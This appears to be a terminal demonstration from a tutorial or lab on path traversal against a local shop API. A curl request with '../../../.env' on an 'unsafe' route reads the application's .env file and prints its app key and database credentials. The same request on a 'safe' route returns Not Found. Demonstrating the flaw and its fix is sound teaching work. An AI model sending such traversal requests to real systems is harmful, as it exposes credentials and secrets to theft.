# A public file
$ curl -s localhost:8000/api/unsafe/files/terms.txt
Terms of sale: prices include VAT; returns within 14 days.
# Climbing out of the folder
$ curl -s --path-as-is localhost:8000/api/unsafe/files/../../../.env
APP_KEY=base64:N13RoeuC3zaVSBLa7dszkBuHp0hxzRmVJo+bJoachcs=
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=shop
DB_USERNAME=bit
DB_PASSWORD=secret
# The same path, on the safe route
$ curl -s --path-as-is localhost:8000/api/files/../../../.env -H 'Accept: application/json' | jq -c
{"message":"Not Found"}
